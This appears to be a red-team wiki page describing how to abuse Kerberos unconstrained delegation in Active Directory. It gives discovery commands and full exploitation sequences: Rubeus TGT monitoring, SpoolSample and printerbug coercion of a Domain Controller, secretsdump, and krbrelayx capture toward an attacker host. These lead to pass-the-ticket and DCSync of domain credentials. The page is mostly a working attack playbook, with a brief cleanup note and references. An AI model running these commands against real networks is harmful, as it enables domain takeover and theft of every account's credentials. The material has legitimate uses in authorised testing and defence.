**Unconstrained delegation** — a computer or user account flagged `TRUSTED_FOR_DELEGATION` caches the **TGT of any principal that authenticates to it**. Compromise such a host, coerce a high-value account (ideally a Domain Controller) to authenticate to it, capture the cached TGT, and reuse it - typically to DCSync. This is the general single-domain case; for the child→parent forest escalation see [Unconstrained delegation - Child to Parent DC](../Trust%20Attacks/Intra%20Forest%20Attacks/Unconstrained%20delegation%20-%20Child%20to%20Parent%20DC.md).

## Discovery

```bash

findDelegation.py 'DOMAIN/USER_NAME:USER_PASS'      # DelegationType = Unconstrained

```

```powershell

Get-DomainComputer -Unconstrained | select samaccountname          # PowerView
Get-ADComputer -Filter {TrustedForDelegation -eq $True}            # AD module

```

**Note:** Domain Controllers have unconstrained delegation by default - that is expected and not the target. You want a *non-DC* host you can compromise.

## Exploitation

You control a host (`UD_HOST`) with unconstrained delegation and want a privileged account's TGT.

### From Windows (Rubeus)

```powershell

# Monitor for and extract incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

```

Then coerce a DC to authenticate to `UD_HOST` (or wait for one):

```powershell

SpoolSample.exe DC_FQDN UD_HOST          # MS-RPRN printer bug
# or PetitPotam / Coercer - see Coercing Authentication

```

Rubeus captures the DC's TGT (base64). Convert/inject it (`Rubeus ptt /ticket:...`) and act as the DC → DCSync.

### From Linux (krbrelayx)

```bash

# 1) get UD_HOST's Kerberos key (you compromised it)
secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@UD_HOST'
# 2) add an SPN + DNS record pointing at the attacker (see the child->parent file for addspn/dnstool detail)
# 3) run krbrelayx in TGT-capture mode with UD_HOST's key
krbrelayx.py -aesKey 'UD_HOST_AES_KEY'
# 4) coerce a DC to authenticate to the attacker FQDN
printerbug.py 'DOMAIN/USER_NAME:USER_PASS'@'DC_FQDN' 'ATTACKER_FQDN'

```

krbrelayx saves the coerced account's TGT to a `.ccache`; `export KRB5CCNAME=...` and DCSync - see [Dump NTDS.dit](../Credential%20Dumping/Dump%20NTDS.dit.md) / [DCSync](../Credential%20Dumping/DCSync.md).

**Note:** this is krbrelayx's **TGT-capture** mode (needs the UD account's key), not its Kerberos-relay mode - see [_Intro to Kerberos Relay](../Relay%20Attacks/Kerberos%20Relay/_Intro%20to%20Kerberos%20Relay.md).

## Caution

Remove any SPN and DNS record you added (see the child→parent file for the exact cleanup commands). Coercion + a rogue SMB/HTTP listener are noisy - note artifacts in the report.

## References

- Dirk-jan Mollema - krbrelayx unconstrained delegation abuse - https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
- The Hacker Recipes - Unconstrained delegation - https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained
- krbrelayx - https://github.com/dirkjanm/krbrelayx
